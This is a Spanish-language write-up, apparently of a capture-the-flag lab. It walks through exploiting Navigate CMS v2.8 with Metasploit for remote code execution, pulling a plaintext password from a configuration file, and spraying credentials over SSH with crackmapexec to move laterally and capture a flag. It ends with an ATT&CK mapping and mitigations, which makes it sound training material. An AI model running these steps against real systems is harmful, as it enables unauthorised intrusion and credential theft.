# Fase 3: Explotación y Movimiento Lateral (Exploitation & Lateral Movement)

## 🎯 Objetivos de la Fase
El objetivo principal de esta fase fue explotar una vulnerabilidad pública en **Navigate CMS v2.8** para lograr la Ejecución Remota de Código (RCE), establecer un acceso inicial bajo la cuenta de servicio web sin privilegios (`www-data`), recolectar credenciales internas desde los archivos de configuración y ejecutar un movimiento lateral a través de SSH para obtener acceso de usuario local.

---

## 3.1 Identificación de Exploits Públicos (`searchsploit`)
Tras la identificación de la versión exacta del sistema de gestión de contenidos (**Navigate CMS v2.8**), se consultó la base de datos local de ExploitDB mediante `searchsploit` para confirmar los vectores de ataque conocidos.

```bash
# Buscar exploits públicos para el CMS identificado
searchsploit navigate CMS
```

### 🔍 Análisis del Hallazgo:
Se confirmó la existencia de exploits públicos para Navigate CMS v2.8 que apuntan a vulnerabilidades de inyección de código y subida de archivos arbitrarios sin autenticación.

---

## 3.2 Compromiso Inicial mediante Metasploit Framework
Para garantizar una ejecución de shell confiable y estabilidad en la sesión, se seleccionó Metasploit Framework para lanzar el módulo `navigate_cms_rce` contra el dominio objetivo.

```bash
# Iniciar la consola de Metasploit
msfconsole
```

```text
msf6 > search navigate
msf6 > use 3  # Selección: exploit(multi/http/navigate_cms_rce)
msf6 exploit(multi/http/navigate_cms_rce) > set RHOSTS navigator.hm
msf6 exploit(multi/http/navigate_cms_rce) > exploit
```

### 🔍 Verificación del Acceso Inicial:
El exploit se ejecutó correctamente, abriendo una sesión interactiva de Meterpreter. Se ejecutaron comandos internos del host para confirmar la identidad y actualizar a una shell interactiva del sistema:

```text
meterpreter > getuid
meterpreter > sysinfo
meterpreter > shell
```

```bash
# Escalando a una shell interactiva Bash
Process 1076 created.
Channel 2 created.
bash -i
```

```text
www-data@navigator:~/navigator.hm/navigate$ 
```

* **Estado del Acceso Inicial:** Se aseguró una shell web inicial de bajos privilegios como **`www-data`**.

---

## 3.3 Recolección de Credenciales Internas (cfg/globals.php)
Una vez establecido el acceso web de bajos privilegios, se inspeccionaron los archivos de configuración internos de la aplicación para localizar secretos guardados en texto plano y parámetros del entorno:

```bash
# Revisar el archivo de login e inspeccionar dependencias importadas
cat login.php
```

```text
# Dependencias identificadas:
# require_once('cfg/globals.php');
# require_once('cfg/common.php');
```

```bash
# Inspeccionar el archivo de configuración global
cat cfg/globals.php
```

### 🔍 Extracción de Secretos:
La lectura de `cfg/globals.php` expuso datos de configuración del sistema en texto plano y reveló la cadena de credencial candidata: **`H4x0r`**.

---

## 3.4 Movimiento Lateral y Validación de Credenciales SSH (`crackmapexec`)
La contraseña candidata extraída se añadió al diccionario local (`passwords`). Para pivotar desde el contexto web hacia una cuenta interactiva del sistema, se ejecutó un ataque dirigido de validación de credenciales contra el puerto 22 (SSH) utilizando la lista de usuarios recolectada (`users`).

```bash
# Añadir el secreto recolectado a la lista de contraseñas
echo "H4x0r" >> passwords 

# Pulverización de contraseñas / Validación de credenciales vía SSH
crackmapexec ssh 192.168.120.146 -u users -p passwords
```

### 🔍 Resultado de la Validación (Output):
`crackmapexec` verificó con éxito un conjunto de credenciales válidas del sistema:

```text
SSH 192.168.120.146 22 192.168.120.146 [+] denisse:H4x0r
```

---

## 3.5 Establecimiento de Acceso SSH Interactivo y Captura de la Bandera de Usuario
Con las credenciales del sistema verificadas, se abandonó la shell web limitada de `www-data` a favor de una sesión de terminal SSH interactiva bajo el usuario `denisse`.

```bash
# Conexión inicial mediante SSH
ssh -l denisse 192.168.120.146
```

### 🚩 Obtención de la Bandera de Usuario:
```bash
# Navegación y lectura de la bandera
cd /home/denisse/
ls -la
cat bandera1.txt
```

* **Objetivo Logrado:** Primera bandera de usuario (`bandera1.txt`) capturada con éxito.
* **Límite de Acceso:** Intentar inspeccionar rutas administrativas (`find /root`) resultó en un error de `Permission denied` (Permiso denegado), lo que indicó la necesidad de realizar una escalada de privilegios local.

---

## 🛡️ Mapeo con MITRE ATT&CK
* **Táctica:** Initial Access ([TA0001](https://mitre.org))
    * **Técnica:** Exploit Public-Facing Application ([T1190](https://mitre.org)) - Explotación de RCE sin autenticación en Navigate CMS v2.8.
* **Táctica:** Credential Access ([TA0006](https://mitre.org))
    * **Técnica:** Credentials from Password Stores: Configuration Files ([T1552.001](https://mitre.org)) - Extracción de credenciales en texto plano desde `cfg/globals.php`.
    * **Técnica:** Brute Force: Password Spraying ([T1110.003](https://mitre.org)) - Validación de contraseñas candidatas contra servicios SSH utilizando `crackmapexec`.
* **Táctica:** Lateral Movement ([TA0008](https://mitre.org))
    * **Técnica:** Remote Services: SSH ([T1021.004](https://mitre.org)) - Autenticación formal mediante el servicio nativo SSH usando credenciales de usuario válidas.

---

## 💡 Mitigación y Robustecimiento Defensivo
1. **Parcheo Inmediato del CMS:** Actualizar Navigate CMS v2.8 a una versión parcheada y con soporte para solucionar fallas de RCE sin autenticación.
2. **Restringir Permisos de Archivos de Configuración:** Limitar los permisos del sistema de archivos en aquellos elementos que contengan cadenas sensibles (`cfg/globals.php`), evitando que usuarios o procesos web sin privilegios puedan leerlos.
3. **Imponer Políticas de Complejidad de Contraseñas:** Exigir contraseñas complejas que no figuren en diccionarios para proteger las cuentas del sistema contra ataques automatizados de *password spraying*.
4. **Desplegar Límite de Intentos en SSH (Fail2Ban):** Implementar Fail2Ban o controles de seguridad equivalentes en el puerto 22 para detectar intentos repetidos de autenticación y bloquear automáticamente las direcciones IP atacantes.
